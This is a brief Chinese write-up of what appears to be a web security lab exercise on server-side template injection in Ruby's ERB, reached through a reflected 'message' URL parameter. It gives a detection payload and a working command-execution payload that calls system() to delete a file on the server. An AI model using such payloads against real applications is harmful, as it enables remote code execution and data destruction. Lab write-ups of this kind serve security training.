当点击商品详情的时，没有商品则会在页面显示Unfortunately this product is out of stock

并且该值在url中可以由用户控制，验证存在反射型xss。但是还可以尝试更严重的模板注入



实验提示为ERB模板，该模板为ruby的模板

https://zhuanlan.zhihu.com/p/29440823



验证payload:

```javascript
message=<%= 7 * 7 %>
```



页面输出49说明存在模板注入



实验要求删除Carlos/morale.txt



可以使用命令执行来删除：

payload:

```javascript
<%25+system("rm+/home/carlos/morale.txt")+%25>
```

